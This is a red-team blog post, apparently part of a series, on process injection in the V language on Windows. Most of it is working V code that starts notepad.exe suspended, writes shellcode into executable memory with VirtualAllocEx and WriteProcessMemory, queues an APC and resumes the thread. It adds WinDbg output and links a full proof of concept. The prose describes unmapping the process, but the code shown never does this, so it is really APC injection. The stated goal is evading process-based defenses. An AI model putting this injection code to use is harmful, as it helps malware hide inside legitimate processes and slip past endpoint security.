---
layout: single
title:  "OffensiVe Security with V 2 - Process Hollowing"
date:   2022-04-25 16:54:50 -0500
categories: red-team
tags: vlang windows
permalink: /:categories/:title/

header:
  overlay_image: /images/cloudflare1/banner.png
  overlay_filter: rgba(0, 0, 0, 0.7)
  actions:
     - label: "View Code"
       url: "https://github.com/alexfrancow/offensive-vlang"
  
---

In the previous part of this series of posts, the [injection process](https://alexfrancow.github.io/app-development/OffensiVe-Security-with-V-Shellcode-Execution/) of a **shellcode** in **V** was detailed, in this part another **injection technique** called **Process Hollowing** will be investigated in order to mitigate **process-based defenses**.

> Previous part in: https://alexfrancow.github.io/app-development/OffensiVe-Security-with-V-Shellcode-Execution/

## Process Injection: Process Hollowing
As detailed on [Mitre ATT&CK](https://attack.mitre.org/techniques/T1055/012/) page; "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.

**Process hollowing** is commonly performed by creating a **process in a suspended state** then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native **Windows API** calls such as `CreateProcess`, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as `ZwUnmapViewOfSection` or `NtUnmapViewOfSection` before being written to, realigned to the injected code, and resumed via `VirtualAllocEx`, `WriteProcessMemory`, `SetThreadContext`, then `ResumeThread` respectively.[[1]](http://www.autosectools.com/process-hollowing.pdf)[[2]](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)"

> https://attack.mitre.org/techniques/T1055/012/

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2022-04-25-OffensiVe-Security-with-V-2-Process-Hollowing/Pasted image 20220228114850.png" height="500" width="825" /></p>

### V Time
The malware first creates a **new process** to host the malicious code in `SUSPENDED` mode. This is done by calling `CreateProcessW` and setting the **Process Creation Flag** to `CREATE_SUSPENDED (0x00000004)`. 

```c
// Create a process (notepad.exe)
mut child_stdin := &u32(0)
mut child_stdout_read := &u32(0)
mut child_stdout_write := &u32(0)

cmd := "notepad.exe"

command_line := [32768]u16{}
proc_info := ProcessInformation{}
start_info := StartupInfo{
    lp_reserved2: 0
    lp_reserved: 0
    lp_desktop: 0
    lp_title: 0
    cb: sizeof(C.PROCESS_INFORMATION)
    h_std_input: child_stdin
    h_std_output: child_stdout_write
    h_std_error: child_stdout_write
    dw_flags: u32(C.STARTF_USESTDHANDLES)
}
C.ZeroMemory(&start_info, sizeof(start_info))
C.ZeroMemory(&proc_info, sizeof(proc_info))

C.ExpandEnvironmentStringsW(cmd.to_wide(), voidptr(&command_line), 32768)
		
// CREATE_SUSPENDED 0x00000004 CREATE_NO_WINDOW 0x08000000
create_process_ok := C.CreateProcessW(0, &command_line[0], 0, 0, C.FALSE, 0x00000004|0x08000000, 0, 0, voidptr(&start_info), voidptr(&proc_info))
```

> [CreateProcessW](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw)

The primary thread of the new process is created in a **suspended state**, and does not run until the `ResumeThread` function is called. Next, the malware needs to swap out the contents of the legitimate file with its malicious payload. This is done by unmapping the memory of the target process by calling either `ZwUnmapViewOfSection` or `NtUnmapViewOfSection`. These two **APIs** basically release all memory pointed to by a section. Now that the memory is unmapped, the loader performs `VirtualAllocEx` to allocate new memory for the malware, and uses `WriteProcessMemory` to write each of the malware's sections to the target **process space**. 

```c
C.WaitForSingleObject(proc_info.h_process, 2000)
hprocess := proc_info.h_process
hthread := proc_info.h_thread

// Allocation Memory and Write shellcode to the allocated buffer
// MEM_COMMIT 0x00001000 MEM_RESERVE 0x00002000
// PAGE_EXECUTE_READWRITE 0x40
h_alloc := C.VirtualAllocEx(hprocess, 0, usize(sizeof(shellcode)), 0x00001000|0x00002000, 0x40)

C.WriteProcessMemory(hprocess, h_alloc, shellcode.data, shellcode.len, 0)
```

> In **V**, the `size_t` was recently removed: [b2ecca3966168f20d95325cb5cc93b81e2c36256](https://github.com/vlang/v/commit/b2ecca3966168f20d95325cb5cc93b81e2c36256), so it's necessary change it to `usize` or in this case `u32`.

The **shellcode** is written to **notepad's process memory** and additionally, an [APC routine](https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls), which now points to the **shellcode**, is declared. At the end, the malware resumes the suspended thread by calling `ResumeThread` to take the process **out of suspended state**.

```c
// Inject into the suspended thread
apc_routine := PTHREAD_START_ROUTINE(h_alloc)
C.QueueUserAPC(PAPCFUNC(apc_routine), hthread, 0)

// Resume the suspended thread
C.ResumeThread(hthread)
```

### Debugging

```c
0:000:x86> g
0:000:x86> lm
start    end        module name
00400000 0047d000   3_processHollowing T (export symbols)       C:\Users\IEUser\Documents\V\3_processHollowing.exe
74e90000 74f70000   KERNEL32   (pdb symbols)          c:\symbols\wkernel32.pdb\86DF9D2DE4C8EA80BFFB7DB0A30F7AC71\wkernel32.pdb

0:000:x86> x kernel32!CreateProcessW*
74ea8ba0          KERNEL32!CreateProcessWStub (_CreateProcessWStub@40)

0:000:x86> bp CreateProcessWStub
	
0:000:x86> x kernel32!VirtualAllocEx*
74ec5fb0          KERNEL32!VirtualAllocExStub (_VirtualAllocExStub@20)

0:000:x86> bp VirtualAllocExStub

0:000:x86> x kernel32!WriteProcessMemory*
74ec61c0          KERNEL32!WriteProcessMemoryStub (_WriteProcessMemoryStub@20)
0:000:x86> bp WriteProcessMemoryStub

0:000:x86> g
0:000:x86> g
```

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2022-04-25-OffensiVe-Security-with-V-2-Process-Hollowing/Pasted image 20220228125002.png" height="500" width="825" /></p>

### PoC - Demo
> The final code can be found in this repository.
 https://github.com/alexfrancow/offensive-vlang/blob/main/2_processHollowing.v

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2022-04-25-OffensiVe-Security-with-V-2-Process-Hollowing/2022-02-28 12-52-44.gif" height="500" width="825" /></p>
